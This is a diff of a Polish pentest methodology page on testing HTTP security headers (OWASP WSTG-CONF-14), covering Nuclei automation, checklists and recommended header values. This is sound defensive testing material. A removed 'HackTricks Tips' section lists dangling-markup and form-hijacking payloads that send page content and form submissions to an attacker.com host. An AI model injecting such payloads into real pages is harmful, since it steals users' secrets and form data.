@@ -1,243 +1,191 @@
 # WSTG-CONF-14 — Test Other HTTP Security Header Misconfigurations
 
-## Cele
+## Cel
 
-- Identify improperly configured security headers
-- Verify presence and correct values of all recommended HTTP security headers
-- Find missing headers that leave the application vulnerable
+Sprawdzenie konfiguracji nagłówków bezpieczeństwa HTTP innych niż HSTS i CSP: X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, Cross-Origin-* (COOP/COEP/CORP), Cache-Control. Każdy brakujący/słaby nagłówek otwiera klasyczny atak (clickjacking, MIME sniffing, data leakage przez Referer).
 
-## KOMENDY
+## Automatyzacja Nuclei
 
-### cURL - pobranie wszystkich naglowkow
+### Nasz dedykowany szablon
 
 ```bash
-curl -sI https://TARGET | tee output_all_headers.txt
-
+nuclei -l burp-export.xml -im burp \
+       -t templates/wstg-conf-14-security-headers.yaml \
+       -proxy http://127.0.0.1:8080 \
+       -o results/wstg-conf-14.jsonl
 ```
 
-### Sprawdzenie poszczegolnych naglowkow bezpieczenstwa
+Szablon w jednym requeście z 11 matcherami: X-Frame-Options brak/weak, X-Content-Type-Options brak, Referrer-Policy brak/weak, Permissions-Policy brak, COOP/CORP brak, X-XSS-Protection legacy enabled, Server version disclosure, Cache-Control: public na dynamic, Cache-Control brak.
+
+### Dodatkowe oficjalne szablony Nuclei
 
 ```bash
+# Security headers misconfiguration (compleksowy)
+nuclei -l burp-export.xml -im burp \
+       -t resources/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml
 
-# X-Frame-Options (ochrona przed clickjacking)
-curl -sI https://TARGET | grep -i "X-Frame-Options"
-# Oczekiwany: DENY lub SAMEORIGIN
-
-# X-Content-Type-Options (ochrona przed MIME sniffing)
-curl -sI https://TARGET | grep -i "X-Content-Type-Options"
-# Oczekiwany: nosniff
-
-# X-XSS-Protection (filtr XSS w przegladarce - deprecated ale nadal uzywany)
-curl -sI https://TARGET | grep -i "X-XSS-Protection"
-# Oczekiwany: 0 (wylaczyc - polega na CSP) lub 1; mode=block
-
-# Referrer-Policy (kontrola naglowka Referer)
-curl -sI https://TARGET | grep -i "Referrer-Policy"
-# Oczekiwany: strict-origin-when-cross-origin lub no-referrer
-
-# Permissions-Policy / Feature-Policy
-curl -sI https://TARGET | grep -i "Permissions-Policy"
-curl -sI https://TARGET | grep -i "Feature-Policy"
-# Oczekiwany: ograniczenie dostepu do API przegladarki
-
-# Cache-Control (zapobieganie cache'owaniu wrazliwych danych)
-curl -sI https://TARGET | grep -i "Cache-Control"
-# Oczekiwany dla wrazliwych stron: no-store, no-cache, must-revalidate
-
-# Pragma
-curl -sI https://TARGET | grep -i "Pragma"
-
-# X-Permitted-Cross-Domain-Policies
-curl -sI https://TARGET | grep -i "X-Permitted-Cross-Domain-Policies"
-
-# Cross-Origin-Embedder-Policy
-curl -sI https://TARGET | grep -i "Cross-Origin-Embedder-Policy"
-
-# Cross-Origin-Opener-Policy
-curl -sI https://TARGET | grep -i "Cross-Origin-Opener-Policy"
-
-# Cross-Origin-Resource-Policy
-curl -sI https://TARGET | grep -i "Cross-Origin-Resource-Policy"
-
+# Per-header dedicated:
+nuclei -l burp-export.xml -im burp \
+       -t resources/nuclei-templates/http/misconfiguration/missing-x-frame-options.yaml \
+       -t resources/nuclei-templates/http/misconfiguration/clickjacking-detection.yaml
 ```
 
-### Sprawdzenie na roznych endpointach
+### Suplementarne narzędzia
 
 ```bash
-curl -sI https://TARGET/login | tee output_headers_login.txt
-curl -sI https://TARGET/api/ | tee output_headers_api.txt
-curl -sI https://TARGET/dashboard | tee output_headers_dashboard.txt
+# securityheaders.com - automatic grading
+curl -s "https://securityheaders.com/?q=https://target.com&hide=on&followRedirects=on"
 
+# Mozilla Observatory
+curl -s "https://http-observatory.security.mozilla.org/api/v1/analyze?host=target.com" -X POST
 ```
 
-### Nmap - naglowki bezpieczenstwa
+## Coverage Matrix
 
-```bash
-nmap --script http-security-headers -p 80,443 TARGET -oN output_nmap_sec_headers.txt
-nmap --script http-headers -p 80,443 TARGET -oN output_nmap_headers.txt
+| Wymiar | Pokryte | Nie pokryte |
+|---|---|---|
+| X-Frame-Options brak / weak | ✓ | — |
+| X-Content-Type-Options nosniff | ✓ | — |
+| Referrer-Policy brak / weak | ✓ | — |
+| Permissions-Policy brak | ✓ | granular per-feature → manual |
+| COOP / COEP / CORP brak | ✓ | — |
+| Cache-Control public na dynamic | ✓ | per-endpoint analysis → manual |
+| X-XSS-Protection legacy 1 | ✓ | — |
+| Server version disclosure | ✓ | (cross WSTG-INFO-02) |
+| HSTS | — | osobno → CONF-07 |
+| CSP | — | osobno → CONF-12 |
 
-```
+## Standard pentesterski — jak to robi się wzorowo
 
-### shcheck - sprawdzenie naglowkow bezpieczenstwa
+### Metodologia (5 kroków)
 
-```bash
-shcheck https://TARGET | tee output_shcheck.txt
+1. **Baseline pull**: GET `/` + ekstrakcja wszystkich security headers.
+2. **Per-endpoint check**: niektóre endpointy (login, profile) wymagają stricter headers (Cache-Control: no-store dla login responses).
+3. **Tools cross-check**: securityheaders.com + Mozilla Observatory dla automated grading.
+4. **Clickjacking test**: tworzy `<iframe src="https://target.com/sensitive">` w test page → czy się ładuje (no X-Frame-Options/CSP frame-ancestors).
+5. **Per-stack hardening verification**: framework default settings (Spring Security, Helmet.js Express, Django SecurityMiddleware).
 
-```
+### Co MUSI być sprawdzone (12 punktów)
 
-### Nuclei - naglowki bezpieczenstwa
-
-```bash
-nuclei -u https://TARGET -tags security-headers -o output_nuclei_sec_headers.txt
-nuclei -u https://TARGET -tags headers -o output_nuclei_headers.txt
-
-```
-
-### Sprawdzenie securityheaders.com (API)
-
-```bash
-# Sprawdz recznie: https://securityheaders.com/?q=TARGET
-
-```
-
-### Sprawdzenie niebezpiecznych naglowkow ujawniajacych informacje
-
-```bash
-curl -sI https://TARGET | grep -iE "^(Server|X-Powered-By|X-AspNet-Version|X-AspNetMvc-Version|X-Runtime|X-Version|X-Generator):" | tee output_info_disclosure_headers.txt
-
-```
-
-### Porownanie naglowkow HTTP vs HTTPS
-
-```bash
-curl -sI http://TARGET | tee output_headers_http.txt
-curl -sI https://TARGET | tee output_headers_https.txt
-diff output_headers_http.txt output_headers_https.txt
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-# Brak dedykowanych wordlist - test polega na analizie naglowkow HTTP
-# Uzyj narzedzi automatycznych i manualnej weryfikacji
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. W DevTools > Network: sprawdz Response Headers dla kazdej odpowiedzi
-2. Sprawdz securityheaders.com - automatyczna ocena naglowkow
-3. Zweryfikuj X-Frame-Options: DENY/SAMEORIGIN (ochrona przed clickjacking)
-4. Sprawdz X-Content-Type-Options: nosniff (ochrona przed MIME sniffing)
-5. Sprawdz Referrer-Policy (nie powinien ujawniac URL w zewnetrznych zapytaniach)
-6. Zweryfikuj Permissions-Policy (ograniczenie dostepu do kamer, mikrofonu, GPS)
-7. Sprawdz Cache-Control na stronach z wrazliwymi danymi (no-store)
-8. Zweryfikuj Cross-Origin-Opener-Policy i Cross-Origin-Resource-Policy
-9. Sprawdz czy naglowki informacyjne (Server, X-Powered-By) sa usuniete
-10. Porownaj naglowki na roznych endpointach - czy sa spojne
-11. Sprawdz czy naglowek Set-Cookie ma flagi: Secure, HttpOnly, SameSite
-
-
----
+- [ ] X-Frame-Options DENY/SAMEORIGIN obecny LUB CSP frame-ancestors
+- [ ] X-Content-Type-Options: nosniff
+- [ ] Referrer-Policy ustawiony (preferowane: strict-origin-when-cross-origin)
+- [ ] Permissions-Policy obecny z restrictive defaults
+- [ ] COOP: same-origin (jeśli aplikacja używa OAuth popups)
+- [ ] CORP: same-origin (dla static assets sensitive)
+- [ ] Cache-Control: no-store na authenticated responses
+- [ ] X-XSS-Protection: 0 (legacy disabled, nie 1)
+- [ ] Server header bez wersji (cross WSTG-INFO-02)
+- [ ] X-Powered-By header brak (lub fake)
+- [ ] HSTS (cross WSTG-CONF-07)
+- [ ] CSP (cross WSTG-CONF-12)
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
 > Źródło: OWASP CheatSheetSeries — HTTP_Headers_Cheat_Sheet.md
 
-### Naglowki bezpieczenstwa — kompletna lista
+### Nagłówki bezpieczeństwa — kompletna lista
 
-| Naglowek | Wartosc | Cel |
+| Nagłówek | Wartość | Cel |
 |----------|---------|-----|
 | `X-Content-Type-Options` | `nosniff` | Blokuje MIME sniffing |
 | `X-Frame-Options` | `DENY` / `SAMEORIGIN` | Ochrona przed clickjacking |
 | `Content-Security-Policy` | Restrykcyjna polityka | XSS, injection prevention |
 | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Wymuszanie HTTPS |
 | `Referrer-Policy` | `strict-origin-when-cross-origin` | Kontrola Referer header |
-| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Blokada API przegladarki |
-| `Cross-Origin-Opener-Policy` | `same-origin` | Izolacja okna przegladarki |
+| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Blokada API przeglądarki |
+| `Cross-Origin-Opener-Policy` | `same-origin` | Izolacja okna przeglądarki |
 | `Cross-Origin-Resource-Policy` | `same-origin` | Blokada cross-origin read |
 | `Cross-Origin-Embedder-Policy` | `require-corp` | Wymaganie CORP na zasobach |
-| `Cache-Control` | `no-store` (wrazliwe dane) | Zapobieganie cache'owaniu |
+| `Cache-Control` | `no-store` (wrażliwe dane) | Zapobieganie cache'owaniu |
 
-### Naglowki do USUNIECIA (information disclosure)
+### Nagłówki do USUNIĘCIA (information disclosure)
 
-| Naglowek | Przyklad | Ryzyko |
+| Nagłówek | Przykład | Ryzyko |
 |----------|---------|--------|
 | `Server` | `Apache/2.4.51` | Ujawnia technologie i wersje |
-| `X-Powered-By` | `PHP/8.1.0` | Ujawnia jezyk programowania |
-| `X-AspNet-Version` | `4.0.30319` | Ujawnia wersje .NET |
-| `X-AspNetMvc-Version` | `5.2` | Ujawnia wersje MVC |
+| `X-Powered-By` | `PHP/8.1.0` | Ujawnia język programowania |
+| `X-AspNet-Version` | `4.0.30319` | Ujawnia wersję .NET |
+| `X-AspNetMvc-Version` | `5.2` | Ujawnia wersję MVC |
 | `X-Generator` | `WordPress 6.0` | Ujawnia CMS |
 | `X-Runtime` | `0.012345` | Ujawnia czas przetwarzania (timing attack) |
 
 ### Referrer-Policy — opcje (od najbardziej restrykcyjnej)
 
-- `no-referrer` — nigdy nie wysylaj Referer
-- `same-origin` — wysylaj tylko do tego samego origin
-- `strict-origin` — wysylaj origin (bez path) tylko przez HTTPS→HTTPS
-- `strict-origin-when-cross-origin` — **REKOMENDOWANE** — pelny URL same-origin, origin cross-origin
-- `no-referrer-when-downgrade` — domyslne, nie wysylaj przy HTTPS→HTTP
+- `no-referrer` — nigdy nie wysyłaj Referer
+- `same-origin` — wysyłaj tylko do tego samego origin
+- `strict-origin` — wysyłaj origin (bez path) tylko przez HTTPS→HTTPS
+- `strict-origin-when-cross-origin` — **REKOMENDOWANE** — pełny URL same-origin, origin cross-origin
+- `no-referrer-when-downgrade` — domyślne, nie wysyłaj przy HTTPS→HTTP
 
-### Permissions-Policy — wazne dyrektywy
+### Permissions-Policy — ważne dyrektywy
 
-- `camera=()` — zablokuj dostep do kamery
-- `microphone=()` — zablokuj dostep do mikrofonu
-- `geolocation=()` — zablokuj dostep do lokalizacji
+- `camera=()` — zablokuj dostęp do kamery
+- `microphone=()` — zablokuj dostęp do mikrofonu
+- `geolocation=()` — zablokuj dostęp do lokalizacji
 - `payment=()` — zablokuj Payment Request API
 - `usb=()` — zablokuj WebUSB
 - `display-capture=()` — zablokuj Screen Capture API
 
 ### Cross-Origin headers (COOP/COEP/CORP)
 
-- **COOP** (`same-origin`): izoluje okno przegladarki — blokuje cross-origin window references
-- **CORP** (`same-origin`): blokuje cross-origin read zasobow (obrazy, skrypty, fonty)
-- **COEP** (`require-corp`): wymaga CORP na wszystkich zaladowanych zasobach
-- Razem wlaczaja **cross-origin isolation** — wymagane dla SharedArrayBuffer, high-res timers
+- **COOP** (`same-origin`): izoluje okno przeglądarki — blokuje cross-origin window references
+- **CORP** (`same-origin`): blokuje cross-origin read zasobów (obrazy, skrypty, fonty)
+- **COEP** (`require-corp`): wymaga CORP na wszystkich załadowanych zasobach
+- Razem włączają **cross-origin isolation** — wymagane dla SharedArrayBuffer, high-res timers
 
-### Testowanie naglowkow
+### Testowanie nagłówków
 
-- Sprawdz https://securityheaders.com — automatyczna ocena
-- Porownaj naglowki na roznych endpointach — musza byc spojne
-- Sprawdz naglowki na HTTP vs HTTPS — moga sie roznic
-- Testuj clickjacking: stworz iframe z TARGET — sprawdz czy sie laduje
+- Sprawdź https://securityheaders.com — automatyczna ocena
+- Porównaj nagłówki na różnych endpointach — muszą być spójne
+- Sprawdź nagłówki na HTTP vs HTTPS — mogą się różnić
+- Testuj clickjacking: stwórz iframe z TARGET — sprawdź czy się ładuje
 
-## ROZSZERZENIA BURP SUITE
+## Pentesterskie deep dive
+
+### Mniej znane techniki
+
+- **X-Frame-Options ALLOW-FROM deprecated** — przeglądarki ignorują (Chrome i Firefox); jeśli aplikacja używa, ochrona przeciwko clickjacking nie działa. Migracja do `Content-Security-Policy: frame-ancestors`.
+- **Spectre / Side-channel via brak COOP**: brak `Cross-Origin-Opener-Policy: same-origin` umożliwia cross-origin window references → potencjalne side-channel attacks.
+- **X-XSS-Protection: 1; mode=block bypass**: legacy header (deprecated w nowoczesnych przeglądarkach) — niektóre warianty `1; report=...` mogą ujawniać lokalne paths.
+- **Cache-Control: public na auth response**: response z user-specific data (po `Authorization: Bearer ...`) z `Cache-Control: public` = atakujący może kraść z shared CDN cache (XS-Leak).
+- **Permissions-Policy bypass via iframe**: iframe ze swoim `allow="camera"` może override parent policy → testowanie iframe restrictions.
+- **Server timing attacks via X-Runtime**: precyzyjny czas (ms) ujawnia wewnętrzny processing time → enable timing attacks na auth (różny czas valid vs invalid user).
+
+### Common pitfalls
+
+- **CSP frame-ancestors zastępuje X-Frame-Options ALE w starszych przeglądarkach (IE/legacy mobile) X-Frame-Options dalej potrzebny**: defense in depth = oba.
+- **Per-page security headers inconsistency**: login page ma stricter Cache-Control niż homepage. Jeśli middleware globalny ustawia `Cache-Control: public` to override naivenie.
+- **CDN może strip headers**: niektóre CDN configs nie passing custom security headers → różnica między origin response i delivered response.
+
+### Świeżynki z research
+
+- **XS-Leaks (cross-site leaks)**: https://xsleaks.dev/ — szeroki katalog technik wykorzystujących missing security headers.
+- **OWASP Secure Headers Project**: https://owasp.org/www-project-secure-headers/ — pełny katalog + recommended values.
+- **Mozilla Observatory**: https://observatory.mozilla.org/ — A+ grading
+- **securityheaders.com**: https://securityheaders.com/ — szybki check + grading
+
+## Rozszerzenia Burp Suite
 
 | Rozszerzenie | Opis | Link |
 |---|---|---|
-| Headers Analyzer | Pasywna analiza naglowkow bezpieczenstwa HTTP | [BApp Store](https://portswigger.net/bappstore/8b4fe2571ec54983b6d6c21fbfe17cb2) |
+| Software Version Reporter | Detekcja information leakage w headerach | [GitHub](https://github.com/augustd/burp-suite-software-version-checks) |
+| HTTP Security Headers | Pasywny check headers | community ext |
 
----
+## Źródła
 
-## Wskazówki ASVS
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations
+- OWASP HTTP Headers Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
+- OWASP Secure Headers Project: https://owasp.org/www-project-secure-headers/
+- securityheaders.com: https://securityheaders.com/
+- Mozilla Observatory: https://observatory.mozilla.org/
+- Mozilla Web Security Guidelines: https://infosec.mozilla.org/guidelines/web_security
+- XS-Leaks Wiki: https://xsleaks.dev/
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
-
-### L1 (Podstawowy)
-
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V3.4.2 | Browser Security Mechanism Headers | Verify that the Cross-Origin Resource Sharing (CORS) Access-Control-Allow-Origin header field is a fixed value by the application, or if the Origin HTTP request header field value is used, it is validated against an allowlist of trusted origins. When 'Access-Control-Allow-Origin: *' needs to be used, verify that the response does not include any sensitive information. |
-
-### L2 (Standardowy)
-
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V3.4.4 | Browser Security Mechanism Headers | Verify that all HTTP responses contain an 'X-Content-Type-Options: nosniff' header field. This instructs browsers not to use content sniffing and MIME type guessing for the given response, and to require the response's Content-Type header field value to match the destination resource. For example, the response to a request for a style is only accepted if the response's Content-Type is 'text/css'. This also enables the use of the Cross-Origin Read Blocking (CORB) functionality by the browser. |
-| V3.4.5 | Browser Security Mechanism Headers | Verify that the application sets a referrer policy to prevent leakage of technically sensitive data to third-party services via the 'Referer' HTTP request header field. This can be done using the Referrer-Policy HTTP response header field or via HTML element attributes. Sensitive data could include path and query data in the URL, and for internal non-public applications also the hostname. |
-
-### L3 (Zaawansowany)
+### Wskazówki ASVS
 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
-| V3.4.8 | Browser Security Mechanism Headers | Verify that all HTTP responses that initiate a document rendering (such as responses with Content-Type text/html), include the Cross‑Origin‑Opener‑Policy header field with the same-origin directive or the same-origin-allow-popups directive as required. This prevents attacks that abuse shared access to Window objects, such as tabnabbing and frame counting. |
-
-
----
-
-## HackTricks Tips
-
-### Dangling Markup / Scriptless Injection
-
-- **Unclosed attribute theft**: `<img src='http://attacker.com/?` — page content (w tym secrets) wysłane do next quote
-- **Form hijacking**: `<base href="http://attacker.com/">` — relative form actions → attacker
-- **`formaction` override**: `<button formaction="https://attacker.com">` nadpisuje form action
-- **CSP bypass z user interaction**: `<a href=http://attacker.net>Click</a><base target='` → `window.name` = HTML content
+| V14.4.1 | Configuration (L1) | Web tier configured to serve HTTP responses with safe Content-Type. |
+| V14.4.7 | Configuration (L2) | Application sets sufficient anti-caching headers for sensitive data. |
+| V14.5.1 | Configuration (L1) | HTTP request methods, including OPTIONS and TRACE, are documented. |
